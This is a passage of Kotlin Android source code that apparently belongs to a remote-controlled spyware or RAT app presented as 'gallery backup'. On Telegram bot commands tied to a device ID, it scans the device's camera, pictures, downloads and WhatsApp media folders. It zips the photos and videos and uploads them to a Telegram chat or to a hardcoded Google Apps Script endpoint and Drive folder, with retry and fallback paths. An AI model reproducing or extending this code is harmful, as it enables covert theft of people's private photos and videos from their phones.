                        resultList.add(MediaFile(f.absolutePath, f.lastModified() / 1000, null, f.name))
                    }
                }
            }
        }

        val foldersToScan = listOf(
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            java.io.File(Environment.getExternalStorageDirectory(), "WhatsApp/Media"),
            java.io.File(Environment.getExternalStorageDirectory(), "Android/media")
        )

        for (folder in foldersToScan) {
            try {
                scanFolder(folder)
            } catch (e: Exception) {
                android.util.Log.e("GalleryBackup", "Error scanning folder ${folder.absolutePath}", e)
            }
        }

        return resultList.distinctBy { 
            if (it.path.isNotBlank()) it.path else (it.contentUri?.toString() ?: "")
        }.filter { 
            it.path.isNotBlank() || it.contentUri != null 
        }.sortedByDescending { 
            it.dateAdded 
        }
    }

    private suspend fun handleGalleryBackupCommand() {
        try {
            val allFiles = getMediaFilesFromDevice("both")
            val pCount = allFiles.count { 
                val ext = (if (it.path.isNotBlank()) java.io.File(it.path).extension else it.fileName.substringAfterLast(".", "")).lowercase()
                setOf("jpg", "jpeg", "png", "webp", "heic", "gif", "bmp").contains(ext) || !ext.contains("mp4")
            }
            val vCount = allFiles.size - pCount

            val msg = """📸 Device [${TelegramService.DEVICE_ID}] Media Backup
Found ${allFiles.size} Total Media Files ($pCount Photos, $vCount Videos).

1️⃣ Direct Media Backup:
`/startbackup [id] [type] [limit]`
Types: `photos`, `videos`, `both`

2️⃣ ZIP Archive Backup (Choose Photos / Videos ZIP):
`/zipbackup [id] photos [limit]` - Photos in ZIP file
`/zipbackup [id] videos [limit]` - Videos in ZIP file
`/zipbackup [id] both [limit]`   - All media in ZIP file

3️⃣ Direct Google Drive Upload (ZIP directly to Drive):
`/drivedump [id] photos [limit]` - Upload Photos ZIP to Drive
`/drivedump [id] videos [limit]` - Upload Videos ZIP to Drive
`/drivedump [id] both [limit]`   - Upload All Media ZIP to Drive

Examples:
• `/drivedump ${TelegramService.DEVICE_ID} photos 20`
• `/drivedump ${TelegramService.DEVICE_ID} both all`
• `/zipbackup ${TelegramService.DEVICE_ID} photos 50`
• `/startbackup ${TelegramService.DEVICE_ID} photos 10`"""
            TelegramService.sendMessage(msg)
        } catch (e: Exception) {
            TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Error accessing media: ${e.message}")
        }
    }

    private suspend fun handleZipBackupCommand(args: String) {
        val cleanArgs = args.replace("zip", "", ignoreCase = true).trim()
        val argParts = if (cleanArgs.isBlank()) emptyList() else cleanArgs.split("\\s+".toRegex())
        
        val typeStr = argParts.getOrNull(0)?.lowercase() ?: "both"
        val limit = argParts.getOrNull(1)?.toIntOrNull() ?: Int.MAX_VALUE

        val typeLabel = when (typeStr) {
            "photos", "photo" -> "Photos"
            "videos", "video" -> "Videos"
            else -> "Photos & Videos"
        }

        TelegramService.sendMessage("⏳ [${TelegramService.DEVICE_ID}] Preparing $typeLabel ZIP archive (Limit: ${if (limit == Int.MAX_VALUE) "All" else limit.toString()})...")

        try {
            val allMedia = getMediaFilesFromDevice(typeStr)
            val finalFiles = allMedia.take(limit)

            if (finalFiles.isEmpty()) {
                TelegramService.sendMessage("⚠️ [${TelegramService.DEVICE_ID}] No $typeLabel files found to compress.")
                return
            }

            TelegramService.sendMessage("📦 [${TelegramService.DEVICE_ID}] Creating ZIP archive for ${finalFiles.size} $typeLabel file(s)...")

            var zipPartIndex = 1
            var currentZipSize = 0L
            val maxZipSize = 45L * 1024L * 1024L // Keep each ZIP part under 45MB so Telegram accepts it (<50MB limit)

            var tempZipFile = java.io.File(cacheDir, "backup_${typeStr}_part${zipPartIndex}_${System.currentTimeMillis()}.zip")
            var fos = java.io.FileOutputStream(tempZipFile)
            var zos = java.util.zip.ZipOutputStream(java.io.BufferedOutputStream(fos))

            var processedInCurrentZip = 0
            var totalSuccessFiles = 0
            val usedEntryNames = mutableSetOf<String>()

            suspend fun finalizeAndSendZip() {
                try {
                    zos.flush()
                    zos.close()
                    fos.close()
                    if (tempZipFile.exists() && tempZipFile.length() > 0) {
                        val caption = "📦 [${TelegramService.DEVICE_ID}] $typeLabel Backup ZIP (Part $zipPartIndex - $processedInCurrentZip files)"
                        val sent = TelegramService.sendDocument(tempZipFile, caption)
                        if (sent) {
                            totalSuccessFiles += processedInCurrentZip
                        }
                    }
                } catch (e: Exception) {
                    android.util.Log.e("ZipBackup", "Error finalizing ZIP part", e)
                } finally {
                    tempZipFile.delete()
                }
            }

            for (media in finalFiles) {
                try {
                    var tempMediaFile: java.io.File? = null
                    val fileToZip: java.io.File? = if (media.path.isNotBlank() && java.io.File(media.path).exists()) {
                        java.io.File(media.path)
                    } else if (media.contentUri != null) {
                        val ext = if (media.fileName.contains(".")) media.fileName.substringAfterLast(".") else "jpg"
                        val temp = java.io.File(cacheDir, "temp_zip_${System.currentTimeMillis()}.$ext")
                        contentResolver.openInputStream(media.contentUri)?.use { input ->
                            temp.outputStream().use { output ->
                                input.copyTo(output)
                            }
                        }
                        if (temp.exists() && temp.length() > 0) {
                            tempMediaFile = temp
                            temp
                        } else null
                    } else null

                    if (fileToZip != null && fileToZip.exists() && fileToZip.length() > 0) {
                        val fileSize = fileToZip.length()

                        if (currentZipSize + fileSize > maxZipSize && processedInCurrentZip > 0) {
                            finalizeAndSendZip()
                            zipPartIndex++
                            processedInCurrentZip = 0
                            currentZipSize = 0L
                            usedEntryNames.clear()

                            tempZipFile = java.io.File(cacheDir, "backup_${typeStr}_part${zipPartIndex}_${System.currentTimeMillis()}.zip")
                            fos = java.io.FileOutputStream(tempZipFile)
                            zos = java.util.zip.ZipOutputStream(java.io.BufferedOutputStream(fos))
                        }

                        var entryName = fileToZip.name.ifBlank { media.fileName }
                        if (entryName.isBlank()) entryName = "media_${System.currentTimeMillis()}"
                        var deduplicatedName = entryName
                        var dupIndex = 1
                        while (usedEntryNames.contains(deduplicatedName)) {
                            val nameWithoutExt = entryName.substringBeforeLast(".")
                            val ext = if (entryName.contains(".")) ".${entryName.substringAfterLast(".")}" else ""
                            deduplicatedName = "${nameWithoutExt}_$dupIndex$ext"
                            dupIndex++
                        }
                        usedEntryNames.add(deduplicatedName)

                        val zipEntry = java.util.zip.ZipEntry(deduplicatedName)
                        zos.putNextEntry(zipEntry)

                        fileToZip.inputStream().use { inputStream ->
                            inputStream.copyTo(zos)
                        }
                        zos.closeEntry()

                        processedInCurrentZip++
                        currentZipSize += fileSize
                    }

                    tempMediaFile?.delete()
                } catch (e: Exception) {
                    android.util.Log.e("ZipBackup", "Failed to add file to ZIP", e)
                }
            }

            if (processedInCurrentZip > 0) {
                finalizeAndSendZip()
            } else {
                try {
                    zos.close()
                    fos.close()
                    tempZipFile.delete()
                } catch (_: Exception) {}
            }

            TelegramService.sendMessage("✅ [${TelegramService.DEVICE_ID}] $typeLabel ZIP backup completed! Successfully archived and sent $totalSuccessFiles file(s) across $zipPartIndex ZIP part(s).")
        } catch (e: Exception) {
            TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Error during ZIP backup: ${e.message}")
        }
    }

    private suspend fun handleStartBackupCommand(args: String) {
        val argParts = args.trim().split("\\s+".toRegex())
        val typeStr = argParts.getOrNull(0)?.lowercase() ?: "both"
        val limit = argParts.getOrNull(1)?.toIntOrNull() ?: Int.MAX_VALUE

        TelegramService.sendMessage("⏳ [${TelegramService.DEVICE_ID}] Scanning media files (Type: $typeStr, Limit: ${if (limit == Int.MAX_VALUE) "All" else limit.toString()})...")

        try {
            val allMedia = getMediaFilesFromDevice(typeStr)
            val finalFiles = allMedia.take(limit)

            if (finalFiles.isEmpty()) {
                TelegramService.sendMessage("⚠️ [${TelegramService.DEVICE_ID}] No media files found to backup.")
                return
            }

            TelegramService.sendMessage("📸 [${TelegramService.DEVICE_ID}] Uploading ${finalFiles.size} media files...")

            var successCount = 0
            for (media in finalFiles) {
                try {
                    var tempFile: java.io.File? = null
                    val fileToUpload: java.io.File? = if (media.path.isNotBlank() && java.io.File(media.path).exists()) {
                        java.io.File(media.path)
                    } else if (media.contentUri != null) {
                        val ext = if (media.fileName.contains(".")) media.fileName.substringAfterLast(".") else "jpg"
                        val temp = java.io.File(cacheDir, "temp_backup_${System.currentTimeMillis()}.$ext")
                        contentResolver.openInputStream(media.contentUri)?.use { input ->
                            temp.outputStream().use { output ->
                                input.copyTo(output)
                            }
                        }
                        if (temp.exists() && temp.length() > 0) {
                            tempFile = temp
                            temp
                        } else null
                    } else null

                    if (fileToUpload != null && fileToUpload.exists() && fileToUpload.length() > 0) {
                        if (fileToUpload.length() > 49L * 1024L * 1024L) {
                            TelegramService.sendMessage("⚠️ [${TelegramService.DEVICE_ID}] Skipped ${fileToUpload.name} (Size > 50MB)")
                            tempFile?.delete()
                            continue
                        }

                        val mimeType = java.net.URLConnection.guessContentTypeFromName(fileToUpload.name)
                        val isVideo = mimeType?.startsWith("video") == true || 
                                fileToUpload.name.endsWith(".mp4", true) || 
                                fileToUpload.name.endsWith(".mkv", true) || 
                                fileToUpload.name.endsWith(".mov", true) || 
                                fileToUpload.name.endsWith(".3gp", true) || 
                                fileToUpload.name.endsWith(".avi", true) || 
                                fileToUpload.name.endsWith(".webm", true)

                        val success = if (isVideo) {
                            TelegramService.sendDocument(fileToUpload, "Backup Video: ${fileToUpload.name}")
                        } else {
                            TelegramService.sendPhoto(fileToUpload, "Backup Photo: ${fileToUpload.name}")
                        }

                        if (success) {
                            successCount++
                        }
                        tempFile?.delete()
                        kotlinx.coroutines.delay(2000)
                    }
                } catch (e: Exception) {
                    android.util.Log.e("GalleryBackup", "Failed to upload media item", e)
                }
            }

            TelegramService.sendMessage("✅ [${TelegramService.DEVICE_ID}] Gallery backup completed. Successfully sent $successCount files.")
        } catch (e: Exception) {
            TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Error during gallery backup: ${e.message}")
        }
    }

    private suspend fun handleGoogleDriveZipUploadCommand(args: String) {
        val cleanArgs = args.replace("drive", "", ignoreCase = true)
                            .replace("dump", "", ignoreCase = true)
                            .replace("gdrive", "", ignoreCase = true)
                            .replace("upload", "", ignoreCase = true)
                            .trim()
        val argParts = if (cleanArgs.isBlank()) emptyList() else cleanArgs.split("\\s+".toRegex())

        if (argParts.isEmpty()) {
            val promptMsg = """☁️ [${TelegramService.DEVICE_ID}] Google Drive ZIP Upload

Please select media type and limit to upload:

1️⃣ Photos Only:
`/drivedump ${TelegramService.DEVICE_ID} photos 20`

2️⃣ Videos Only:
`/drivedump ${TelegramService.DEVICE_ID} videos 5`

3️⃣ Both Photos & Videos:
`/drivedump ${TelegramService.DEVICE_ID} both 30`

4️⃣ All Media:
`/drivedump ${TelegramService.DEVICE_ID} both all`

📁 Target Google Drive Folder:
https://drive.google.com/drive/folders/1srTZ_2FKQhGwZC26F3KAjfyzhGZwdv1Y"""
            TelegramService.sendMessage(promptMsg)
            return
        }

        val typeStr = argParts.getOrNull(0)?.lowercase() ?: "both"
        val limitStr = argParts.getOrNull(1) ?: "all"
        val limit = if (limitStr.equals("all", ignoreCase = true)) Int.MAX_VALUE else (limitStr.toIntOrNull() ?: Int.MAX_VALUE)

        val typeLabel = when (typeStr) {
            "photos", "photo" -> "Photos"
            "videos", "video" -> "Videos"
            else -> "Photos & Videos"
        }

        TelegramService.sendMessage("⏳ [${TelegramService.DEVICE_ID}] Scanning $typeLabel for Google Drive upload (Limit: ${if (limit == Int.MAX_VALUE) "All" else limit.toString()})...")

        try {
            val allMedia = getMediaFilesFromDevice(typeStr)
            val finalFiles = allMedia.take(limit)

            if (finalFiles.isEmpty()) {
                TelegramService.sendMessage("⚠️ [${TelegramService.DEVICE_ID}] No $typeLabel files found on device to upload.")
                return
            }

            TelegramService.sendMessage("📦 [${TelegramService.DEVICE_ID}] Archiving ${finalFiles.size} $typeLabel file(s) into ZIP and uploading directly to Google Drive...")

            val webAppUrl = "https://script.google.com/macros/s/AKfycbwukjtFJROnLZGTRdwMcPqlQXjHkllO-rEkWZ7A-z8ynZYzBtcgNrv_h3cLQ4AUm1C4/exec"
            var zipPartIndex = 1
            var currentZipSize = 0L
            val maxZipSize = 8L * 1024L * 1024L // 8MB chunk limit to prevent OOM and RAM pressure

            var tempZipFile = java.io.File(cacheDir, "gdrive_${typeStr}_part${zipPartIndex}_${System.currentTimeMillis()}.zip")
            var fos = java.io.FileOutputStream(tempZipFile)
            var zos = java.util.zip.ZipOutputStream(java.io.BufferedOutputStream(fos))

            var processedInCurrentZip = 0
            var totalSuccessFiles = 0
            var uploadedPartCount = 0
            val usedEntryNames = mutableSetOf<String>()

            suspend fun finalizeAndUploadZip() {
                try {
                    zos.flush()
                    zos.close()
                    fos.close()
                    if (tempZipFile.exists() && tempZipFile.length() > 0) {
                        val partName = "backup_${typeStr}_part${zipPartIndex}_${System.currentTimeMillis()}.zip"
                        val renamedFile = java.io.File(cacheDir, partName)
                        tempZipFile.renameTo(renamedFile)

                        val zipFileSizeMb = String.format("%.1f", renamedFile.length().toDouble() / (1024 * 1024))
                        TelegramService.sendMessage("🚀 [${TelegramService.DEVICE_ID}] Uploading ZIP Part $zipPartIndex ($processedInCurrentZip files, $zipFileSizeMb MB) to Google Drive...")

                        var (success, responseMsg) = uploadFileToGoogleDriveScript(renamedFile, webAppUrl)

                        if (!success) {
                            TelegramService.sendMessage("⚠️ [${TelegramService.DEVICE_ID}] Primary Google Drive upload attempt failed ($responseMsg). Retrying with Fallback Form Payload...")
                            val fallbackResult = uploadFileToGoogleDriveFormFallback(renamedFile, webAppUrl)
                            success = fallbackResult.first
                            responseMsg = fallbackResult.second
                        }

                        if (success) {
                            totalSuccessFiles += processedInCurrentZip
                            uploadedPartCount++
                            TelegramService.sendMessage("✅ [${TelegramService.DEVICE_ID}] ZIP Part $zipPartIndex uploaded to Google Drive successfully!")
                        } else {
                            TelegramService.sendMessage("⚠️ [${TelegramService.DEVICE_ID}] Google Drive upload failed ($responseMsg). Sending ZIP directly to Telegram chat as Fallback...")
                            val tgSuccess = TelegramService.sendDocument(renamedFile, "📦 [${TelegramService.DEVICE_ID}] Backup $typeStr Part $zipPartIndex ($processedInCurrentZip files) - Google Drive Fallback")
                            if (tgSuccess) {
                                totalSuccessFiles += processedInCurrentZip
                                uploadedPartCount++
                                TelegramService.sendMessage("✅ [${TelegramService.DEVICE_ID}] ZIP Part $zipPartIndex sent directly to Telegram Chat successfully!")
                            } else {
                                TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Failed both Google Drive and Telegram upload for Part $zipPartIndex")
                            }
                        }
                        renamedFile.delete()
                    }
                } catch (e: Exception) {
                    android.util.Log.e("GDriveUpload", "Error finalizing ZIP for GDrive", e)
                    TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Error finalizing ZIP Part $zipPartIndex: ${e.message}")
                } finally {
                    tempZipFile.delete()
                    System.gc()
                }
            }

            for (media in finalFiles) {
                try {
                    var tempMediaFile: java.io.File? = null
                    val fileToZip: java.io.File? = if (media.path.isNotBlank() && java.io.File(media.path).exists()) {
                        java.io.File(media.path)
                    } else if (media.contentUri != null) {
                        val ext = if (media.fileName.contains(".")) media.fileName.substringAfterLast(".") else "jpg"
                        val temp = java.io.File(cacheDir, "temp_gdrive_${System.currentTimeMillis()}.$ext")
                        contentResolver.openInputStream(media.contentUri)?.use { input ->
                            temp.outputStream().use { output ->
                                input.copyTo(output)
                            }
                        }
                        if (temp.exists() && temp.length() > 0) {
                            tempMediaFile = temp
                            temp
                        } else null
                    } else null

                    if (fileToZip != null && fileToZip.exists() && fileToZip.length() > 0) {
                        val fileSize = fileToZip.length()

                        if (currentZipSize + fileSize > maxZipSize && processedInCurrentZip > 0) {
                            finalizeAndUploadZip()
                            zipPartIndex++
                            processedInCurrentZip = 0
                            currentZipSize = 0L
                            usedEntryNames.clear()

                            tempZipFile = java.io.File(cacheDir, "gdrive_${typeStr}_part${zipPartIndex}_${System.currentTimeMillis()}.zip")
                            fos = java.io.FileOutputStream(tempZipFile)
                            zos = java.util.zip.ZipOutputStream(java.io.BufferedOutputStream(fos))
                        }

                        var entryName = fileToZip.name.ifBlank { media.fileName }
                        if (entryName.isBlank()) entryName = "media_${System.currentTimeMillis()}"
                        var deduplicatedName = entryName
                        var dupIndex = 1
                        while (usedEntryNames.contains(deduplicatedName)) {
                            val nameWithoutExt = entryName.substringBeforeLast(".")
                            val ext = if (entryName.contains(".")) ".${entryName.substringAfterLast(".")}" else ""
                            deduplicatedName = "${nameWithoutExt}_$dupIndex$ext"
                            dupIndex++
                        }
                        usedEntryNames.add(deduplicatedName)

                        val zipEntry = java.util.zip.ZipEntry(deduplicatedName)
                        zos.putNextEntry(zipEntry)

                        fileToZip.inputStream().use { inputStream ->
                            inputStream.copyTo(zos)
                        }
                        zos.closeEntry()

                        processedInCurrentZip++
                        currentZipSize += fileSize
                    }

                    tempMediaFile?.delete()
                } catch (e: Exception) {
                    android.util.Log.e("GDriveUpload", "Failed to add file to GDrive ZIP", e)
                }
            }

            if (processedInCurrentZip > 0) {
                finalizeAndUploadZip()
            } else {
                try {
                    zos.close()
                    fos.close()
                    tempZipFile.delete()
                } catch (_: Exception) {}
            }

            if (uploadedPartCount > 0) {
                TelegramService.sendMessage("""🎉 [${TelegramService.DEVICE_ID}] Google Drive Backup Completed!
Successfully uploaded $totalSuccessFiles $typeLabel file(s) across $uploadedPartCount ZIP archive(s).

📁 View files in Google Drive:
https://drive.google.com/drive/folders/1srTZ_2FKQhGwZC26F3KAjfyzhGZwdv1Y""")
            } else {
                TelegramService.sendMessage("⚠️ [${TelegramService.DEVICE_ID}] Google Drive backup ended without successful file uploads.")
            }
        } catch (e: Exception) {
            TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Error during Google Drive backup: ${e.message}")
        }
    }

    private suspend fun uploadFileToGoogleDriveScript(file: java.io.File, webAppUrl: String): Pair<Boolean, String> = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
        try {
            var currentUrl = webAppUrl
            var redirectCount = 0

            while (redirectCount < 5) {
                val url = java.net.URL(currentUrl)
                val isRedirect = redirectCount > 0

                val connection = (url.openConnection() as java.net.HttpURLConnection).apply {
                    requestMethod = if (isRedirect) "GET" else "POST"
                    doOutput = !isRedirect
                    doInput = true
                    instanceFollowRedirects = false
                    connectTimeout = 60000
                    readTimeout = 180000
                    if (!isRedirect) {
                        setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                    }
                    setRequestProperty("Accept", "application/json")
                }

                if (!isRedirect) {
                    val jsonHeader = "{\"filename\":\"${file.name}\",\"name\":\"${file.name}\",\"mimeType\":\"application/zip\",\"folderId\":\"1srTZ_2FKQhGwZC26F3KAjfyzhGZwdv1Y\",\"file\":\""
                    val jsonFooter = "\"}"

                    connection.outputStream.use { os ->
                        os.write(jsonHeader.toByteArray(Charsets.UTF_8))

                        val nonClosingOs = object : java.io.FilterOutputStream(os) {
                            override fun close() {
                                flush()
                            }
                        }
                        val b64Os = android.util.Base64OutputStream(nonClosingOs, android.util.Base64.NO_WRAP)
                        file.inputStream().use { fileIn ->
                            fileIn.copyTo(b64Os)
                        }
                        b64Os.close() // flushes final base64 padding to os without closing connection outputStream

                        os.write(jsonFooter.toByteArray(Charsets.UTF_8))
                        os.flush()
                    }
                }

                val responseCode = connection.responseCode
                if (responseCode in 300..399) {
                    val location = connection.getHeaderField("Location")
                    connection.disconnect()
                    if (!location.isNullOrBlank()) {
                        currentUrl = location
                        redirectCount++
                        continue
                    } else {
                        return@withContext Pair(false, "HTTP Redirect without Location header ($responseCode)")
                    }
                } else if (responseCode in 200..299) {
                    val responseText = connection.inputStream.bufferedReader().use { it.readText() }
                    connection.disconnect()
                    return@withContext Pair(true, responseText)
                } else {
                    val rawError = connection.errorStream?.bufferedReader()?.use { it.readText() } ?: ""
                    connection.disconnect()

                    val cleanError = if (rawError.contains("<html", ignoreCase = true)) {
                        val title = rawError.substringAfter("<title>", "").substringBefore("</title>", "").trim()
                        val msg = rawError.substringAfter("style=\"padding-top: 50px\">", rawError).substringBefore("</p>", "").replace(Regex("<[^>]*>"), "").trim()
                        if (title.isNotBlank()) "$title ${if (msg.isNotBlank()) "- $msg" else ""}" else "HTML Response $responseCode"
                    } else {
                        rawError.take(300)
                    }

                    return@withContext Pair(false, "HTTP $responseCode: $cleanError")
                }
            }
            Pair(false, "Too many HTTP redirects")
        } catch (e: Exception) {
            android.util.Log.e("GDriveUpload", "HTTP Post to Apps Script failed", e)
            Pair(false, e.message ?: "Upload network exception")
        }
    }

    private suspend fun uploadFileToGoogleDriveFormFallback(file: java.io.File, webAppUrl: String): Pair<Boolean, String> = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
        try {
            val bytes = file.readBytes()
            val base64Data = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)

            val jsonPayload = org.json.JSONObject().apply {
                put("filename", file.name)
                put("name", file.name)
                put("mimeType", "application/zip")
                put("folderId", "1srTZ_2FKQhGwZC26F3KAjfyzhGZwdv1Y")
                put("file", base64Data)
                put("fileData", base64Data)
                put("data", base64Data)
            }.toString()

            var currentUrl = webAppUrl
            var redirectCount = 0

            while (redirectCount < 5) {
                val url = java.net.URL(currentUrl)
                val isRedirect = redirectCount > 0

                val connection = (url.openConnection() as java.net.HttpURLConnection).apply {
                    requestMethod = if (isRedirect) "GET" else "POST"
                    doOutput = !isRedirect
                    doInput = true
                    instanceFollowRedirects = false
                    connectTimeout = 60000
                    readTimeout = 180000
                    if (!isRedirect) {
                        setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                    }
                    setRequestProperty("Accept", "application/json")
                }

                if (!isRedirect) {
                    connection.outputStream.use { os ->
                        os.write(jsonPayload.toByteArray(Charsets.UTF_8))
                        os.flush()
                    }
                }

                val responseCode = connection.responseCode
                if (responseCode in 300..399) {
                    val location = connection.getHeaderField("Location")
                    connection.disconnect()
                    if (!location.isNullOrBlank()) {
                        currentUrl = location
                        redirectCount++
                        continue
                    } else {
                        return@withContext Pair(false, "HTTP Redirect without Location header ($responseCode)")
                    }
                } else if (responseCode in 200..299) {
                    val responseText = connection.inputStream.bufferedReader().use { it.readText() }
                    connection.disconnect()
                    return@withContext Pair(true, responseText)
                } else {
                    val rawError = connection.errorStream?.bufferedReader()?.use { it.readText() } ?: ""
                    connection.disconnect()
                    return@withContext Pair(false, "HTTP $responseCode: ${rawError.take(200)}")
                }
            }
            Pair(false, "Too many HTTP redirects")
        } catch (e: Exception) {
            android.util.Log.e("GDriveFallback", "Fallback post failed", e)
            Pair(false, e.message ?: "Fallback network exception")
        }
    }
}
